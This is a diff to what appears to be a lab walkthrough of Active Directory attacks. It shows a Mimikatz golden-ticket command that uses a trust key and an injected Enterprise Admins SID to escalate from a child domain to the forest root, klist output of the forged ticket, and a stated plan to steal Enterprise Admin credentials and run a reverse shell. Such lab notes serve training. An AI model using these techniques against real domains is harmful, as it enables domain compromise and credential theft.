@@ -41,6 +41,7 @@ Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
 ```powershell
 PS C:\AD\Tools\kekeo_old> Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:3cbaa731b987e575822f00ddd6701a7b /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
 ```
+![image](https://github.com/user-attachments/assets/0e24cd36-c72d-419e-977e-3d5e195c70b5)
 
 5. Request to create a TGS ticket for a service (CIFS) in the parent domain (moneycorp.local):
 ```powershell
@@ -81,8 +82,34 @@ mimikatz(powershell) # kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi
 ```powershell
 PS C:\AD\Tools> klist
 ```
+```
+Current LogonId is 0:0xdac101e2
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ dollarcorp.moneycorp.local
+        Server: krbtgt/dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local   --> krbtgt has done
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+        Start Time: 7/15/2020 0:11:34 (local)
+        End Time:   7/13/2030 0:11:34 (local)
+        Renew Time: 7/13/2030 0:11:34 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+PS C:\AD\Tools>
+```
 
 12. Extract credentials of the Enterprise Administrator for use in DC-Shadow and schedule a task on the forest root DC to execute a reverse shell:
 ```powershell
 PS C:\AD\Tools> gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
+
+System Directory : C:\Windows\system32 
+Organization    :
+Build Number     : 14393
+Registered User  : Windows User
+Serial Number    : 00377-80000-00000-AA549
+Version         : 10.0.14393
 ```
+Let’s extract credential of the Enterprise Administrator which can be used later for DC-Shadow. We will schedule a task on the forest root DC and execute a reverse shell on it.	
